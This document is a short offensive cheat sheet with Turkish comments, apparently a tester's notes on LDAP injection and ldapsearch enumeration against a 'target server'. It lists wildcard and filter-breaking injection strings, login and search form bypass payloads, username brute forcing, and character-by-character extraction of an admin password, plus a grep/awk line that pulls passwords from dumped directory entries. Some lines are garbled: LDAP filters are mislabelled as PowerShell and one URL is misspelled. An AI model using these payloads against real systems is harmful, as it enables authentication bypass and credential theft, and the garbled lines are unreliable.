# LDAP Injection
```powershell
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password)) > domain_objects

(&(objectClass=user)(sAMAccountName=$username = "*")(userPassword=$password)) > domain_objects

(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password = "*")) > domain_objects

grep -E "uid:|userPassword" domain_objects | paste - - | awk '{print $2, $4}'
```

# Ldapsearch
```powershell
ldapsearch -H ldap://<ip>:389 -x -b "dc=example,dc=com" "(objectClass=person)"

ldapsearch -H ldap://<ip>:389 -D "cn=admin,dc=example,dc=com" -w <pass> -b "dc=example,dc=com" "(objectClass=*)"

# Base DN keşfi
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "" -s base "(objectClass=*)"

# Wildcard ile tüm kullanıcıları listeleme
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=*)"

# Admin bypass denemeleri
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=admin*)" 
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(|(uid=admin*))"

# Filter injection - base filter'ı bozma
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" ")(uid=*))(|(uid=*"
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "*)(uid=*))(|(uid=*"

# Kullanıcı adı brute force
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=a*)" 2>/dev/null
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=b*)" 2>/dev/null

# Admin kullanıcı varsa şifre brute force (karakter karakter)
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(&(uid=admin)(userPassword=a*))" 2>/dev/null
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(&(uid=admin)(userPassword=b*))" 2>/dev/null

# Login formu için
username=admin*&password=*
username=*)(uid=*))(|(uid=*&password=*
username=admin)(&)&password=*

# Search fonksiyonu için
search=*)(uid=*))(|(uid=*
search=admin*
search=*)(objectClass=*

# Mevcut attribute'ları bulma
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(objectClass=*)" +
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(cn=*)" "*"

# Spesifik attribute'larda injection denemesi
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(description=*)" 
ldapsearch -x -H "ldef-sunucu:389" -b "dc=hedef,dc=com" "(description=*)(|(cn=*))"
```
